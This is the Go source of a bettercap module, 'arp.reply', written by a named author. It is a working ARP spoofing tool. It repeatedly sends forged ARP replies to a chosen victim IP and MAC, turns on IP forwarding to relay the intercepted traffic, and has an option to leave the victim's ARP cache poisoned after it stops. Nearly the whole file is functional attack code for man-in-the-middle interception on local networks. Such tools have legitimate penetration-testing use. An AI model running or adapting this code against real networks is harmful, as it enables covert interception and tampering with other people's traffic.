package arp_reply

import (
	"net"
	"strings"
	"sync"
	"time"

	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"
)

type ArpReplyer struct {
	session.SessionModule
	/*
		addresses   []net.IP
		macs        []net.HardwareAddr
		wAddresses  []net.IP
		wMacs       []net.HardwareAddr
	*/
	aliasMac      net.HardwareAddr
	spoofAddress  net.IP
	victimMac     net.HardwareAddr
	victimAddress net.IP
	fullDuplex    bool
	skipRestore   bool
	waitGroup     *sync.WaitGroup
}

func NewArpReplyer(s *session.Session) *ArpReplyer {
	mod := &ArpReplyer{
		SessionModule: session.NewSessionModule("arp.reply", s),
		/*
			addresses:     make([]net.IP, 0),
			macs:          make([]net.HardwareAddr, 0),
			wAddresses:    make([]net.IP, 0),
			wMacs:         make([]net.HardwareAddr, 0),
		*/
		aliasMac:      nil,
		spoofAddress:  nil,
		victimMac:     nil,
		victimAddress: nil,

		fullDuplex:  false,
		skipRestore: false,
		waitGroup:   &sync.WaitGroup{},
	}
	//mod.Error("Session.Interface", mod.Session.Interface)

	//mod.SessionModule.Requires("net.recon")

	//
	// Define Parameters
	//

	mod.AddParam(session.NewStringParameter("arp.reply.vict_mac", session.ParamGatewayMac, "", "Victim MAC address"))
	mod.AddParam(session.NewStringParameter("arp.reply.vict_addr", session.ParamGatewayAddress, "", "Victim IP address"))
	mod.AddParam(session.NewStringParameter("arp.reply.alias_mac", session.ParamIfaceMac, "", "Tells the victim to redirect the network traffic of alias IP  to this MAC address"))
	mod.AddParam(session.NewStringParameter("arp.reply.spoof_addr", session.ParamIfaceAddress, "", "IP address that you want to spoof"))

	mod.AddParam(session.NewBoolParameter("arp.reply.fullduplex",
		"false",
		""))

	noRestore := session.NewBoolParameter("arp.reply.skip_restore",
		"false",
		"If set to true, targets arp cache won't be restored when spoofing is stopped.")

	mod.AddObservableParam(noRestore, func(v string) {
		if strings.ToLower(v) == "true" || v == "1" {
			mod.skipRestore = true
			mod.Warning("arp cache restoration after spoofing disabled")
		} else {
			mod.skipRestore = false
			mod.Debug("arp cache restoration after spoofing enabled")
		}
	})

	//
	// HANDLERS
	//

	mod.AddHandler(session.NewModuleHandler("arp.reply on", "",
		"Start ARP spoofer.",
		func(args []string) error {
			return mod.Start()
		}))

	mod.AddHandler(session.NewModuleHandler("arp.reply off", "",
		"Stop ARP spoofer.",
		func(args []string) error {
			return mod.Stop()
		}))

	//
	// END
	//

	return mod
}

func (mod ArpReplyer) Name() string {
	return "arp.reply"
}

func (mod ArpReplyer) Description() string {
	return "Send ARP replyes to a target victim. Victim MAC and IP must be specified."
}

func (mod ArpReplyer) Author() string {
	return "Francesco Pasquali pasquali.public@gmail.com"
}

func (mod *ArpReplyer) Configure() error {
	//var err error

	mod.aliasMac = mod.Session.Interface.HW
	mod.spoofAddress = mod.Session.Interface.IP
	mod.victimMac = mod.Session.Gateway.HW
	mod.victimAddress = mod.Session.Gateway.IP

	if err, tmp_bool := mod.BoolParam("arp.reply.fullduplex"); err != nil {
		return err
	} else if mod.fullDuplex = tmp_bool; false {
	} else if err, tmp_ip := mod.IPParam("arp.reply.vict_addr"); err != nil {
		return err
	} else if mod.victimAddress = tmp_ip; false {
	} else if err, tmp_ip := mod.IPParam("arp.reply.spoof_addr"); err != nil {
		return err
	} else if mod.spoofAddress = tmp_ip; false {
	} else if err, tmp_mac := mod.MACParam("arp.reply.vict_mac"); err != nil {
		return err
	} else if mod.victimMac = tmp_mac; false {
	} else if err, tmp_mac := mod.MACParam("arp.reply.alias_mac"); err != nil {
		return err
	} else if mod.aliasMac = tmp_mac; false {
	}

	if !mod.Session.Firewall.IsForwardingEnabled() {
		mod.Info("enabling forwarding")
		mod.Session.Firewall.EnableForwarding(true)
	}

	return nil
}

func (mod *ArpReplyer) Start() error {
	if err := mod.Configure(); err != nil {
		return err
	}

	return mod.SetRunning(true, func() {

		mod.Info("arp replyer started")

		if mod.fullDuplex {
			mod.Warning("full duplex replying is still not supported")
		}

		mod.waitGroup.Add(1)
		defer mod.waitGroup.Done()

		for mod.Running() {
			sIp := mod.spoofAddress
			aMac := mod.aliasMac
			vIp := mod.victimAddress
			vMac := mod.victimMac

			if err, pkt := packets.NewARPReply(sIp, aMac, vIp, vMac); err != nil {
				mod.Error("error while creating ARP spoof packet for %s: %s", vIp, err)
			} else {
				mod.Debug("sending %d bytes of ARP packet to %s:%s.", len(pkt), vIp, vMac)
				mod.Session.Queue.Send(pkt)
			}

			time.Sleep(1 * time.Second)
		}
	})
}

func (mod *ArpReplyer) unSpoof() error {

	if mod.skipRestore {
		mod.Warning("arp cache restoration is disabled")
		return nil
	}

	sIp := mod.spoofAddress
	vIp := mod.victimAddress
	vMac := mod.victimMac

	if sMac, err := mod.Session.FindMAC(sIp, false); err != nil {
		mod.Warning("Could not find mac address for %s, skipping cache restore.", sIp)
		return err
	} else if err, pkt := packets.NewARPReply(sIp, sMac, vIp, vMac); err != nil {
		mod.Error("error while creating ARP spoof packet for %s: %s", vIp, err)
	} else {
		mod.Debug("sending %d bytes of ARP packet to %s:%s.", len(pkt), vIp, vMac)
		mod.Session.Queue.Send(pkt)
	}

	return nil
}

func (mod *ArpReplyer) Stop() error {
	return mod.SetRunning(false, func() {
		mod.Info("waiting for ARP replyier to stop ...")
		mod.unSpoof()
		mod.waitGroup.Wait()
	})
}
